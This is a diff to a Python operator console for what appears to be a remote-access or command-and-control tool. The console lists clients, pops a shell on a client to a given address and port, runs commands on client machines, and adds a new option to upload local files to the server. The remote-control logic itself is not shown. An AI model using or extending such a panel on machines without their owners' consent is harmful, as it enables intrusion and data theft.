@@ -1,10 +1,11 @@
 #!/usr/bin/python3
 from front import admin
+import os
 
 
 stayInProgram=True
 res=False
-commands = ['help','listClients','popShell','runComand', 'testServer', 'testClient','exit']
+commands = ['help','listClients','popShell','runComand', 'testServer', 'testClient','sendFile2Server','exit']
 
 exit = len(commands) - 1
 
@@ -12,16 +13,11 @@ master=admin()
 
 while stayInProgram :
     wait = True
-    print (
-        "List of commands:" + "\n\n" +
-        "0 - help" + "\n" +
-        "1 - listClients" +  "\n" +
-        "2 - popShell"  + "\n" +
-        "3 - runComand"  + "\n" +
-        "4 - testServer"  + "\n" +
-        "5 - testClient"  + "\n" +
-        "6 - exit"  + "\n"
-    )
+    i=0
+    print("List of commands:\n\n")
+    while (i < len(commands) ):
+        print (str(i) + " - " + commands[i])
+        i+=1
     command = exit;
 
     try : 
@@ -44,21 +40,22 @@ while stayInProgram :
         "3 - runComand: run a command on the client machine."  + "\n\n" +
         "4 - testServer: tests the connection to the server."  + "\n\n" +
         "5 - testClient: tests the connection on the client machine."  + "\n\n" +
-        "6 - exit: disconnects of the server."  + "\n"
+        "6 - sendFile2Server: send file to server."  + "\n\n" +
+        "7 - exit: disconnects of the server."  + "\n"
     )
 
     elif (command == 1): #listClients
         try:
             if not (master.displayClients()):
-               raise Exception("Não achado\n")
-        except:
-            print("Returned Error!!")
+               raise Exception("server not find")
+        except Exception as e:
+            print(e)
 
     
     elif (command == 2): #popShell
         try:
             if not (master.displayClients()):
-                raise Exception("Não achado\n")
+                raise Exception("server not find")
 
             client = int(input("What client?"))
             print("\n")
@@ -68,15 +65,15 @@ while stayInProgram :
             print("\n")
 
             if not (master.abrirShell(client,addres,port)):
-                raise Exception("Não achado\n")
-        except:
-            print("Returned Error!!")
+                raise Exception("server not find")
+        except Exception as e:
+            print(e)
 
 
     elif (command == 3): #runComand
         try:
             if not (master.displayClients()):
-                raise Exception("Não achado\n")
+                raise Exception("server not find")
             
             client = int(input("What client?"))
             print("\n")
@@ -84,29 +81,44 @@ while stayInProgram :
             print("\n")
 
             if not (master.runCommand(comd,client)):
-                raise Exception("Não achado\n")
-        except:
-            print("Returned Error!!")
+                raise Exception("server not find")
+        except Exception as e:
+            print(e)
     
     elif (command == 4): #testServer
         try:
             if not(master.testServer()):
-                raise Exception("Não achado\n")
-        except:
-            print("Returned Error!!")
+                raise Exception("server not find")
+        except Exception as e:
+            print(e)
     
     elif (command == 5): #testClient
         try:
             if not (master.displayClients()):
-                raise Exception("Não achado\n")
+                raise Exception("server not find")
             
             client = int(input("What client?"))
             print("\n")
 
             if not(master.testClient(client)):
-                raise Exception("Não achado\n")
-        except:
-            print("Returned Error!!")
+                raise Exception("server not find")
+
+        except Exception as e:
+            print(e)
+    
+    elif (command == 6): #sendFile2Server
+        try:
+            os.system("ls -l | grep -v \"drw\" | awk '{print $9}'")
+            lFile = input("\nWhat file? ")
+            if not(master.localFile(lFile)):
+                raise  Exception("file not find")
+
+
+            if not(master.sendFile2Server(lFile)):
+                raise Exception("server not find")
+
+        except Exception as e:
+            print(e)
 
     elif (command == exit): #exit
         stayInProgram = False
